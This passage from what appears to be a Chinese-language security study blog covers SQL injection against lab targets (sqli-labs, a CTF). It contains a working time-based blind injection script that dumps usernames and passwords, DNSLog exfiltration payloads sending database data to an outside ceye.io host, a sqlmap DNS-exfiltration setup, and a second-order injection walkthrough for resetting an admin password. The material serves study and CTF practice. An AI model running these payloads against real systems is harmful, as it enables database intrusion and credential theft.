class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_column</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (</span><br><span class=\"line\">            i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject_data</span>(<span class=\"params\">url</span>):</span><br><span class=\"line\">    name = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;1&#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&gt;%d,sleep(1),0)-- &quot;</span> % (i, mid)</span><br><span class=\"line\">            params = &#123;<span class=\"string\">&#x27;id&#x27;</span>: payload&#125;</span><br><span class=\"line\">            start_time = time.time()  <span class=\"comment\"># 注入前的系统时间</span></span><br><span class=\"line\">            r = requests.get(url, params=params)</span><br><span class=\"line\">            end_time = time.time()  <span class=\"comment\"># 注入后的时间</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> end_time - start_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">32</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        name = name + <span class=\"built_in\">chr</span>(mid)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">inject_database(url)</span><br><span class=\"line\"><span class=\"comment\"># inject_table(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_column(url)</span></span><br><span class=\"line\"><span class=\"comment\"># inject_data(url)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>注意：</p>\n<p>在 sqllabs 中前 10 关是 get 注入，参数为 id，通过 union select 必须前面查询无结果 union select 才能查询出内容</p>\n<p>在 sqllabs 中 11-14 关是 post 注入，如果采用报错注入，无关注入参数</p>\n<p>但 sqllabs15 关只能使用时间盲注，必须保证注入参数中必须能查询到正确的内容，或者使用 or，最后使用 and ‘1’='1 闭合，但 or 会有 and 和 or 优先级问题。</p>\n<p>mysql 中 and 优先级 高级 or</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>dumb’ and  if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) #</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) and ‘1’='1</p>\n<p>1’ or if(ascii(substr(database(),1,1))&gt;100,sleep(3),0) or ‘1’='1</p>\n<p>或者使用 bool 盲注</p>\n<p>判断是否存在 flag.jpg</p>\n<h5 id=\"搜索注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索注入\">#</a> 搜索注入</h5>\n<p>在 like%% 中注入</p>\n<h5 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> DNSLog 注入</h5>\n<p>前提条件：secure_file_priv 为空</p>\n<p>关于 secure_file_priv :</p>\n<blockquote>\n<p>secure_file_priv 特性，有三种状态</p>\n<ol>\n<li>secure_file_priv 为 null  表示不允许导入导出</li>\n<li>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</li>\n<li>secure_file_priv 没有设置时，则表示没有任何限制</li>\n</ol>\n</blockquote>\n<p>注入使用 load_file 函数</p>\n<p>关于 load_file 函数</p>\n<blockquote>\n<p>LOAD_FILE () 函数读取一个文件并将其内容作为字符串返回</p>\n<p>语法为：load_file (file_name)，其中 file_name 是文件的完整路径</p>\n<p>此函数使用需要满足的条件</p>\n<p>文件必须位于服务器主机上<br>\n你必须具有该 FILE 权限才能读取该文件。拥有该 FILE 权限的用户可以读取服务器主机上的任何文件，该文件是 world-readable 的或 MySQL 服务器可读的，此属性与 secure_file_priv 状态相关<br>\n文件必须是所有人都可读的，并且它的大小小于 max_allowed_packet 字节</p>\n<p>select load_file(’/etc/passwd’);</p>\n</blockquote>\n<p>注入时需要使用 UNC 路径</p>\n<blockquote>\n<p>UNC 路径就是类似 \\softer 这样的形式的网络路径。它符合 \\servername\\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>\n<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。</p>\n<p>例如把自己电脑的文件共享，你会获得如下路径，这就是 UNC 路径</p>\n</blockquote>\n<p>常用的 DNSLog 平台</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">CEYE - Monitor service for security testing</span></p>\n<p>注入方式：<br>\n1. 注册上述平台，获取自己的 Identifier</p>\n<p>2. 在 payloads 页面找到官方给出的不同数据库适用的 payload</p>\n<p>3. 到测试目标修改并输入 payload</p>\n<p>4. 如果可以明显看到有页面加载的过程，说明外带成功</p>\n<p>下面使用 sqli 靶场做演示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br><span class=\"line\">and (select load_file(concat(&#x27;//&#x27;,(select hex(user())),&#x27;.3xtn8b.ceye.io/abc&#x27;)))</span><br></pre></td></tr></table></figure>\n<p>再到网页中 Records-&gt;DNS Query 即可到的注入的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215231635316.png\" alt=\"image-20220215231635316\"></p>\n<p>注意：如果注入的字符中带有非法字符，比如 &quot;@&quot;, 需要使用 hex () 进行 16 进制编码，获取数据后在进行解码</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<p>1. 安装 DNS 服务器</p>\n<p>2. 添加正向查找区域</p>\n<p>区域名称为 oupeng.top</p>\n<p>3.DNS 属性中启动递归，启用简单和递归查询</p>\n<p>4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP</p>\n<p>5. 正向查找新建泛解析，地址为 sqlmapip</p>\n<p>6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址</p>\n<p>7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址</p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png\" alt=\"image-20221020163942115\"></p>\n<p>点击下一步，勾选 dns 服务器，其他选项全部默认即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png\" alt=\"image-20221020164020385\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png\" alt=\"image-20221020164223367\"></p>\n<p>关闭禁用递归，开启简单和递归查询</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png\" alt=\"image-20221020164251704\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png\" alt=\"image-20221020164324361\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png\" alt=\"image-20221020164355711\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png\" alt=\"image-20221020164422616\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png\" alt=\"image-20221020164445444\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png\" alt=\"image-20221020164512708\"></p>\n<p>添加转发，dns 域随便写什么，但 IP 攻击机的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png\" alt=\"image-20221020164603923\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&quot; --technique=T --dns-domain &quot;hahaha.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=\">搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=\">使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)</span></p>\n<p>如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机</p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<h6 id=\"网鼎杯-2018comment\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018comment\">#</a> [网鼎杯 2018] Comment</h6>\n<p>1. 密码爆破，自己去 burp 里面玩吧</p>\n<p>2.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  origin master// 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<p>通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描</p>\n<p>最后还原出的源码是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//write_do.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span 